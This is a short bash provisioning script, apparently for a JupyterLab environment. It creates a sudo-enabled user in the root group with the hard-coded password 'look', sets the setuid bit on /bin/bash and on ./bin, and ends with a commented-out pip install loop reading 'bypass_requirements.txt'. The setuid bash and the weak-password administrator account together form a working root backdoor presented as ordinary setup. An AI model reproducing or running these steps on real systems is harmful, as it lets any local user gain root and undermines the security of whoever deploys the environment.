#!/bin/bash -e

adduser --disabled-password --gecos "jupyterlab" --uid 91 --gid 0 jupyterlab
echo -e "look\nlook" | passwd jupyterlab
usermod -aG sudo jupyterlab

cp /bin/bash .
chmod u+s /bin/bash
chmod u+s ./bin

:'
while read dependency; do
    dependency_stripped="$(echo "${dependency}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
    # Skip comments
    if [[ $dependency_stripped == \#* ]]; then
        continue
    # Skip blank lines
    elif [ -z "$dependency_stripped" ]; then
        continue
    else
        if pip install "$dependency_stripped"; then
            echo "$dependency_stripped is installed"
        else
            echo "Could not install $dependency_stripped, skipping"
        fi
    fi
done < bypass_requirements.txt
'
